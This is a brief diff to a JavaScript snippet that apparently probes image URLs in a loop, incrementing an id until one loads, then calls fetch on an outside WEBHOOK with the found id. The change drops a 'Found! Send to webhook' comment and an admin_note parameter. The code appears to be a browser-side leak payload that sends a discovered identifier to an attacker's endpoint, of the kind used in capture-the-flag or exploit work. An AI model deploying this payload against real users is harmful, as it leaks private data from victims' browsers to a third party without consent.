@@ -9,8 +9,7 @@ let id = 1;
 function tryId() {
   const img = new Image();
   img.onload = () => {
-    // Found! Send to webhook
-    fetch(WEBHOOK + "?admin_note=" + id);
+    fetch(WEBHOOK + id);
   };
   img.onerror = () => {
     id++;
